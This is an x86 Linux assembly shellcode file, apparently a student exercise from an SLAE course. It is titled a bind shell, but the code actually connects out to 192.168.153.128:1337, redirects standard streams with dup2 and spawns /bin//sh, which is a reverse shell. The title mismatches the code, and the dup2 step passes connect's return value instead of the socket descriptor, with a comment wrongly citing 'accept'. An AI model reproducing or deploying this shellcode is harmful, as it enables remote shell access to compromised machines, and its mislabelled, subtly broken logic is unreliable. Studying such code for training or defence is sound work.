; Title: BindShell.nasm
; Author: Muhann4d
; StudentID: SLAE-887

global _start

section .text

_start:


	; int socketcall(int call, unsigned long *args);
	; int socket(int socket_family, int socket_type, int protocol);


	xor eax, eax		; zero out eax as we dont know what value it holds
	mov ebx, eax		; zero out ebx by moving the eax value to it
	push eax		; push eax value (zero) to the stack for last arg (LIFO)
	mov al,0x66		; move the value of socketcall 102 to eax
	inc ebx			; increase ebx by one for 
	push byte 0x1		; push 1 to the stack for 2nd arg (LIFO)
	push byte 0x2		; push 2 to the stack for 3nd arg (LIFO)
	mov ecx, esp		; set esp (agrs) to ecx
	int 0x80		; exec the syscall


	; int socketcall(int call, unsigned long *args);
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);


	mov edx, eax		; move returned eax (sockfd) value to edx
	xor eax, eax		; zero eax
	mov al, 0x66		; set the value of (socketcall) 102 to eax
	mov bl, 0x3		; set the value 3 to ebx (Connect)
	push 0x8099a8c0		; push the IP to the stack (192.168.153.128)
	push word 0x3905	; push the port to the stack (1337)
	push word 0x2		; push 2 to the stack (AF_INET) 
	mov ecx, esp		; save esp value to ecx
	push 0x10		; push address length (16) to stack
	push ecx		; push the esp value we saved above
	push edx		; push sockfd to the stack
	mov ecx, esp		; save new esp address to ecx
	int 0x80		; exec connect


	; int socketcall(int call, unsigned long *args);
	; int dup2(int oldfd, int newfd);

 	
	mov ebx, eax			; Set ebx to the return value of our (accept)
	xor ecx, ecx			; zero ecx value
	mov cl, 0x2			; set ecx to 2 (counter)
loop:
	mov al, 0x3f   			; set eax vlaue to 63 (dup2) 
	int 0x80   			; exec dup2
	dec ecx    			; Decrement counter
	jns loop   			; as long as SF is not set, jmp to loop


	; int execve(const char *filename, char *const argv[],char *const envp[]);


 	xor eax, eax		   	; zero eax value
 	push eax			; push eax value (0) to the stack 
 	push dword 0x68732f2f  		; push "//sh" to the stack
 	push dword 0x6e69622f  		; push "/bin" to the stack
 	mov ebx, esp   		   	; set ebx to our stack pointer
 	mov al, 0xb			; Set eax value to 11 (execeve)
	xor ecx, ecx			; zero ecx
	mov edx, ecx			; zero edx
 	int 0x80   			; exec execve
